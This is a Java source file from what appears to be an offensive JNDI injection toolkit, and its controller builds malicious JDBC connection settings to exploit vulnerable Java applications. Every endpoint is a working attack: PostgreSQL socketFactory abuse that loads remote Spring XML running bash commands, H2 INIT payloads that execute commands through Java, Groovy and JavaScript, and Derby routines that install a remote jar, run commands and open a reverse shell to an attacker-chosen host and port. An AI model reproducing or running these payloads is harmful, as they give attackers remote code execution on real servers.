package map.jndi.controller;

import javassist.ClassPool;
import javassist.CtClass;
import map.jndi.Config;
import map.jndi.annotation.JNDIController;
import map.jndi.annotation.JNDIMapping;
import map.jndi.server.WebServer;
import map.jndi.template.DerbyJarTemplate;
import map.jndi.util.JarUtil;
import map.jndi.util.MiscUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

@JNDIController
public class DatabaseController implements Controller {
    @JNDIMapping("/PostgreSQL/Command/{cmd}")
    public Properties postgresqlCommand(String cmd) {
        System.out.println("[PostgreSQL] Cmd: " + cmd);

        String fileName = MiscUtil.getRandStr(12) + ".xml";
        String fileContent = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                "        <constructor-arg>\n" +
                "        <list>\n" +
                "            <value>bash</value>\n" +
                "            <value>-c</value>\n" +
                "            <value><![CDATA[" + cmd + "]]></value>\n" +
                "        </list>\n" +
                "        </constructor-arg>\n" +
                "    </bean>\n" +
                "</beans>";
        WebServer.serveFile( "/" + fileName, fileContent.getBytes());

        String socketFactory = "org.springframework.context.support.ClassPathXmlApplicationContext";
        String socketFactoryArg = Config.codebase + fileName;
        String url = "jdbc:postgresql://127.0.0.1:5432/test?socketFactory=" + socketFactory + "&socketFactoryArg=" + socketFactoryArg;

        Properties props = new Properties();
        props.setProperty("driver", "org.postgresql.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/H2/Alias/{cmd}")
    public Properties h2Alias(String cmd) {
        System.out.println("[H2] [CREATE ALIAS] Cmd: " + cmd);

        String url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;" +
                "INIT=CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'\\;" +
                "CALL EXEC ('" + cmd + "')\\;";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/H2/Groovy/{cmd}")
    public Properties h2Groovy(String cmd) {
        System.out.println("[H2] [Groovy] Cmd: " + cmd);

        String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"" + cmd + "\")" + "})" + "def x";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +"'";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/H2/JavaScript/{cmd}")
    public Properties h2JavaScript(String cmd) {
        System.out.println("[H2] [JavaScript] Cmd: " + cmd);

        String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
        String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '"+ javascript +"'";

        Properties props = new Properties();
        props.setProperty("driver", "org.h2.Driver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/Derby/Create/{database}")
    public Properties derbyCreate(String database) {
        System.out.println("[Derby] [Create] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/Derby/Drop/{database}")
    public Properties derbyDrop(String database) {
        System.out.println("[Derby] [Drop] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";drop=true";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/Derby/Slave/{database}/{host}/{port}")
    public Properties derbySlave(String host, String port, String database) {
        System.out.println("[Derby] [Slave] Host: " + host + " Port: " + port + " Database: " + database);

        String url = "jdbc:derby:memory" + database + ";startMaster=true;slaveHost=" + host + ";slavePort=" + port;

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);

        return props;
    }

    @JNDIMapping("/Derby/Install/{database}")
    public Properties derbyInstall(String database) throws Exception {
        System.out.println("[Derby] [Install] Database: " + database);

        String url = "jdbc:derby:memory:" + database + ";create=true";

        String className = MiscUtil.getRandStr(12);
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(DerbyJarTemplate.class.getName());
        clazz.replaceClassName(clazz.getName(), className);

        String jarName = className;
        byte[] jarBytes = JarUtil.create(jarName, clazz.toBytecode());
        WebServer.serveFile("/" + jarName + ".jar", jarBytes);

        List<String> list = new ArrayList<>();
        list.add("CALL SQLJ.INSTALL_JAR('" + Config.codebase + jarName + ".jar', 'APP." + className + "', 0)");
        list.add("CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath', 'APP." + className + "')");
        list.add("CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".exec'");
        list.add("CREATE PROCEDURE rev(IN host VARCHAR(255), IN port VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME '" + className + ".rev'");

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", String.join(";", list));

        return props;
    }

    @JNDIMapping("/Derby/Command/{database}/{cmd}")
    public Properties derbyCommand(String database, String cmd) {
        System.out.println("[Derby] [Command] Cmd: " + cmd);

        String url = "jdbc:derby:memory:" + database + ";create=true";
        String sql = "CALL cmd('" + cmd  + "')";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }

    @JNDIMapping("/Derby/ReverseShell/{database}/{host}/{port}")
    public Properties derbyReverseShell(String database, String host, String port) {
        System.out.println("[Derby] [ReverseShell] Host: " + host + " Port: " + port);

        String url = "jdbc:derby:" + database + ";create=true";
        String sql = "CALL rev('" + host + "', '" + port + "')";

        Properties props = new Properties();
        props.setProperty("driver", "org.apache.derby.jdbc.EmbeddedDriver");
        props.setProperty("url", url);
        props.setProperty("sql", sql);

        return props;
    }
}
